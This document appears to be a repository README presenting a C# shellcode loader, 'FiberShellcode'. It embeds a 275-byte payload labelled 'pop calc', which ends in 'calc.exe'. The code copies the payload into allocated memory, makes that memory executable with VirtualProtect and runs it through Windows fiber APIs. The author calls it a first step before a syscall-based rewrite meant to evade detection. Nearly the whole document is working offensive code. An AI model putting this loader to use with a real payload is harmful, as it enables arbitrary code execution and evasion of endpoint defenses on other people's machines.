# FiberShellcode
Execute shellcode with Fiber, basic steps before rewrite to syscall, I use csc.exe to compile.


Fiber.cs:

using System;
using System.Runtime.InteropServices;

public class code
{
    public const uint MEM_COMMIT = 0x00001000;
    public const uint MEM_RESERVE = 0x00002000;
    public const uint PAGE_EXECUTE_READWRITE = 0x40;
    public const uint GENERIC_ALL = 0x1FFFFF;
    public const uint PAGE_READWRITE = 0x04;

    [DllImport("kernel32.dll")]
    extern static IntPtr ConvertThreadToFiber(int fiberData);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateFiber(uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter);

    [DllImport("kernel32.dll")]
    extern static IntPtr SwitchToFiber(IntPtr fiberAddress);

    [DllImport("kernel32.dll")]
    extern static void DeleteFiber(IntPtr fiberAddress);

    [DllImport("kernel32")]
    private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);

    [DllImport("Kernel32.dll", SetLastError=false)]
    static extern void RtlMoveMemory(IntPtr dest, IntPtr src, int size);


    public static void Main()
    {
          // sc shellcode pop calc
          byte[] sc = new byte[275] {  72,131,228,240,232,192,0,0,0,65,81,65,80,82,81,86,72,49,210,101,72,139,82,96,72,139,82,24,72,139,82,32,72,139,114,80,72,15,183,74,74,77,49,201,72,49,192,172,60,97,124,2,44,32,65,193,201,13,65,1,193,226,237,82,65,81,72,139,82,32,139,66,60,72,1,208,139,128,136,0,0,0,72,133,192,116,103,72,1,208,80,139,72,24,68,139,64,32,73,1,208,227,86,72,255,201,65,139,52,136,72,1,214,77,49,201,72,49,192,172,65,193,201,13,65,1,193,56,224,117,241,76,3,76,36,8,69,57,209,117,216,88,68,139,64,36,73,1,208,102,65,139,12,72,68,139,64,28,73,1,208,65,139,4,136,72,1,208,65,88,65,88,94,89,90,65,88,65,89,65,90,72,131,236,32,65,82,255,224,88,65,89,90,72,139,18,233,87,255,255,255,93,72,186,1,0,0,0,0,0,0,0,72,141,141,1,1,0,0,65,186,49,139,111,135,255,213,187,224,29,42,10,65,186,166,149,189,157,255,213,72,131,196,40,60,6,124,10,128,251,224,117,5,187,71,19,114,111,106,0,89,65,137,218,255,213,99,97,108,99,46,101,120,101,0 };
          IntPtr lpAddress = VirtualAlloc( IntPtr.Zero, (UInt32)sc.Length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
          IntPtr uPtr = Marshal.AllocHGlobal(sc.Length);
  				Marshal.Copy(sc, 0, uPtr, sc.Length);
          RtlMoveMemory( lpAddress, uPtr, sc.Length);
          uint OldProtection = 0;
          bool result = VirtualProtect( lpAddress, (UInt32)sc.Length, PAGE_EXECUTE_READWRITE, out OldProtection);
          IntPtr ThreadToFiber = ConvertThreadToFiber( 0 );
          IntPtr PtrToFiber = CreateFiber( 0, lpAddress, IntPtr.Zero );
          SwitchToFiber(PtrToFiber);
          Marshal.FreeHGlobal(uPtr);
     }
}
